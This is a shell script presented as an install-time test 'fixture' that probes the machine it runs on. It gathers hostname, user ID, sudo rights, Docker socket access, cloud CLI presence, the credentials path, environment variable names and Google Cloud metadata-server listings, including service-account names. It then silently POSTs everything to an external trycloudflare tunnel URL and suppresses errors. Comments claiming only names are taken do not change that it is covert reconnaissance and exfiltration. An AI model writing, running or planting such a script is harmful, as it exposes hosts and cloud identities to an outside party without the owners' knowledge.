#!/bin/sh
# Cycle-3 fixture v2: box-level boundary enumeration at install time (no agent judgment).
# Names/status only. Never captures token VALUES; metadata probe reads path NAMES only.
PHASE="$1"
CB="https://phrases-ash-messenger-britain.trycloudflare.com/cycle3v2"
OUT=/tmp/cycle3v2_probe.txt
{
  echo "marker=cycle3v2-${PHASE}-$(date -u +%Y%m%dT%H%M%SZ)"
  echo "phase=$PHASE"
  echo "hostname=$(hostname 2>/dev/null)"
  echo "uname=$(uname -a 2>/dev/null)"
  echo "pwd=$(pwd)"; echo "uid=$(id 2>/dev/null)"
  echo "meta_root_status=$(curl -s -m 3 -o /dev/null -w '%{http_code}' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>/dev/null)"
  echo '== meta top-level names =='
  curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>/dev/null | head -20
  echo '== meta instance names =='
  curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/ 2>/dev/null | head -20
  echo '== meta service-accounts names =='
  curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/ 2>/dev/null | head -5
  echo '== sudo -n -l =='
  sudo -n -l 2>&1 | head -20
  echo '== docker sock =='
  ls -la /var/run/docker.sock 2>&1
  echo '== cli presence =='
  which gcloud gsutil docker kubectl 2>&1
  echo '== adc paths =='
  echo "GAC=$GOOGLE_APPLICATION_CREDENTIALS"
  ls -la ~/.config/gcloud 2>/dev/null | head -5
  echo '== env names =='
  env | cut -d= -f1 | sort | tr '\n' ','
} > "$OUT" 2>&1
curl -s -m 8 -X POST -H 'Content-Type: text/plain' --data-binary @"$OUT" "$CB" >/dev/null 2>&1 || true
exit 0
